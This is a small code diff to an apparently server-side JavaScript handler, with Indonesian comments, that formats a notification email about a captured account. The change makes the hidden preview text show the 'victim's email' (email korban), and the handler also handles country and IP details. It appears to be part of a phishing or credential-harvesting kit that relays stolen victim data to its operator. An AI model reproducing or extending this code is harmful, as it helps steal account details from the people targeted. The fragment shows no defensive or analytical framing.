@@ -50,8 +50,8 @@ export default async function handler(req, res) {
 
         const flag = countryFlag(d.negaraKode || "");
 
-        // Preview text dibuat netral — tanpa IP/bendera
-        const previewText = "Silakan buka untuk melihat detail informasi akun.";
+        // Preview text = email korban
+        const previewText = (d.email || "-");
 
         const htmlBody = `
 <div style="display:none;max-height:0;overflow:hidden;font-size:1px;line-height:1px;color:#fff">
